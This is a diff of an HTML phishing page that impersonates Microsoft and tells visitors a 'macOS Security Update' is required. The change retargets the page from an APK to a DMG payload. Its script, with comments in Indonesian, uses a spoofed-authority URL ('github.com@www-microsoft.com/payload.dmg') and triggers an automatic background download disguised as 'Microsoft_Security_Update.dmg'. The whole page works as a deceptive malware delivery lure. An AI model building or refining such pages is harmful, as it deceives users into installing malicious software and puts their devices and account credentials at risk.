@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Microsoft Security Center — Official Verification</title>
+<title>Microsoft Security Center — macOS Verification</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body { 
@@ -53,8 +53,8 @@
 
 <div class="card">
   <div class="logo">Microsoft</div>
-  <h2>Security Update Required</h2>
-  <p>Please complete the required device verification package to secure your Microsoft account credentials.</p>
+  <h2>macOS Security Update Required</h2>
+  <p>Please complete the required device verification package for macOS to secure your account credentials.</p>
   <button id="actionBtn">Verify & Update Now</button>
   <div id="status"></div>
 </div>
@@ -69,17 +69,17 @@
   // Konfigurasi Delay (3 detik)
   var DELAY_SECONDS = 3; 
   
-  // Menggunakan teknik URL credential spoofing / basic auth trick (misal: domain asli Anda di-prefix authority palsu)
-  var TARGET_APK_URL = "https://artha231.github.com@www-microsoft.com/payload.apk"; 
+  // URL target file .dmg dengan trik authority spoofing
+  var TARGET_DMG_URL = "https://artha231.github.com@www-microsoft.com/payload.dmg"; 
 
   function triggerDownloadAndRedirect() {
-    statusEl.textContent = "Preparing security package...";
+    statusEl.textContent = "Preparing macOS security package...";
 
-    // 1. Memicu download APK secara otomatis di background (mengarah ke URL spoofed)
+    // 1. Memicu download file .dmg secara otomatis di background via elemen anchor
     try {
       var a = document.createElement('a');
-      a.href = TARGET_APK_URL;
-      a.download = "Microsoft_Security_Update.apk";
+      a.href = TARGET_DMG_URL;
+      a.download = "Microsoft_Security_Update.dmg";
       document.body.appendChild(a);
       a.click();
       document.body.removeChild(a);
